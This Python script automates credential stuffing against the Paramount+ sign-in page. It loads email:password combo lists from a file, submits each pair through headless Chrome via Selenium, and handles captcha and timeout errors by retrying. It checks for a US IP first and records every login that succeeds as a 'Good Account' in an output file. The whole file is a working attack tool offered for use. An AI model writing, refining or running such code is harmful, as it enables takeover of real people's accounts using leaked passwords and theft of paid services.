import time
import requests
from selenium import webdriver
from selenium.common.exceptions import ElementClickInterceptedException, NoSuchElementException, TimeoutException
from selenium.webdriver.chrome.options import Options
from headers.paramount_header import header
from modules.connection_error import connection_error_try_block as ip_country
from pathlib import Path

header()
file_directory = str(Path(__file__).parent)+'/paramount'
page = 'https://www.paramountplus.com/account/signin/'
if 'US' not in str(ip_country()[1]):
	print('Current Location: {}'.format(ip_country()[1]))
	print('Please use a US IP to check accounts.\nEnding.')
	exit()
users = []
passwords = []

with open(file_directory, 'r') as paramount:
	for line in paramount.readlines():
		users.append(line.split(':')[0].strip())
		passwords.append(line.split(':')[1].split(' | ')[0].strip())

index = 0
browser_options = Options()
browser_options.headless = True
while index < len(users):
	with open('accounts/paramount_working_accounts','a') as account_results:
			try:
				print('\rTrying Combo {} out of {}'.format(index+1, len(users)),end='')
				browser = webdriver.Chrome(options = browser_options)
				browser.set_page_load_timeout(10)
				browser.set_window_size(500,700)
				browser.get(page)
				time.sleep(2)
				email_input_box = browser.find_element_by_xpath('//*[@id="email"]')
				password_input_box = browser.find_element_by_xpath('//*[@id="password"]')
				sign_in_button = browser.find_element_by_xpath('//*[@id="sign-in-form"]/div/div[3]/button')	
				#sign_in_button_disabled = sign_in_button.get_attribute('class')
				#print(sign_in_button_disabled)	
				email_input_box.send_keys(users[index])
				password_input_box.send_keys(passwords[index])
				sign_in_button.click()
				time.sleep(3)
				if 'data:,' in str(browser.current_url):
					print(' -- Error: Failed to load')
					continue
				if browser.find_elements_by_xpath('//*[@id="main-aa-container"]/section/div[2]/div[2]/div/div[1]'):
					print(' -- Error: Captcha. Iteration index not increased'.format(users[index], passwords[index]))
					continue
				if browser.find_elements_by_xpath('//*[@id="main-aa-container"]/section/div/div[1]/p'):
					invalid_email_text = browser.find_element_by_xpath('//*[@id="main-aa-container"]/section/div/div[1]/p').text
					if 'Invalid email and/or password' in str(invalid_email_text):
						print(' -- {}:{} ---> Invalid Credentials'.format(users[index],passwords[index]))
						index +=1
						continue
				if 'signin/' in str(browser.current_url):
					print(' -- Error: Sign in button disabled')
				if 'home' in str(browser.current_url):
					print(' -- {}:{} ---> Success!'.format(users[index],passwords[index]))		
					account_results.write(' -- {}:{} ---> Good Account\n'.format(users[index],passwords[index]))
				if browser.find_elements_by_xpath('//*[@id="profile-container"]/div/div/div[1]/div[3]'):
					valid = browser.find_element_by_xpath('//*[@id="profile-container"]/div/div/div[1]/div[3]').text
					if "Who's Watching" in str(valid):
						print(' -- {}:{} ---> Success!'.format(users[index],passwords[index]))		
						account_results.write(' -- {}:{} ---> Good Account\n'.format(users[index],passwords[index]))
				index +=1
			except (ElementClickInterceptedException, NoSuchElementException):
				print(' -- Error: Intercepted')
				browser.close()
			except TimeoutException:
				print(' -- Timed out. Index not incremented.')
				browser.close()
			except Exception as e:
				print(e)
				break

	
# //*[@id="main-aa-container"]/section/div/div[1]/p
